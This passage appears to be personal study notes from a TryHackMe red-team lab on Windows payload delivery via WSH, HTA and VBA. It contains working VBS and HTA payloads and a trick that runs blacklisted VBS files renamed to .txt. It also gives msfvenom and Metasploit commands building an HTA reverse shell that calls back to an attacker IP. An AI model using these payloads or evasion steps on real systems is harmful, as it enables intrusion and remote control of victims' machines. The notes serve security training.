second stage of the Cyber Kill Chain model. In this stage, the attacker generates and develops their own malicious code using deliverable payloads such as word documents, PDFs, etc. [1](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- ![[Pasted image 20260705194637.png]]
[**reference**](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development)
- Most organizations block or monitor the execution of `.exe` files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:
	- The Windows Script Host (`WSH`)
	- An HTML Application (`HTA`)
	- Visual Basic Applications (`VBA`)
	- Powershell (`PSH`)
## Windows Scripting Host (WSH)

*built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.*
It is a Windows native engine, **cscript.exe** (for command-line scripts) and **wscript.exe** (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe [MORE INFO](https://en.wikipedia.org/wiki/VBScript)

> [!example] hello.vbs
```vb 
Dim message 
message = "Welcome to THM"
MsgBox message
```

> [!example] we can execute `.exe` files using the Windows native engine (`WSH`).
```vb
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```
```powershell
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
# you can use both wscript and cscript
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
```
=> calculator will pop-up
>[!danger] If the VBS files are blacklisted, then we can rename the file to `.txt` file and run it using `wscript` as follows,
```powershell
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

## HTML Application (HTA)

*dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool `mshta` is used to execute files*

>[!example] payload.hta
```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
=>
```powershell
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
# then open the link through browser 
```

![[Pasted image 20260705201646.png]]

- building a reverse shell using HTA file by **Metasploit**
```powershell
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```
- or use msfconsole directly by `msfconsole -q`
```powershell
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```

## Visual Basic for Application (VBA)

_VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc_

-  VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.
- One of VBA's features is accessing the Windows Application Programming Interface ( [windows api reference](https://en.wikipedia.org/wiki/Windows_API)) and other low-level functionality. For more information about VBA, visit [here](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications).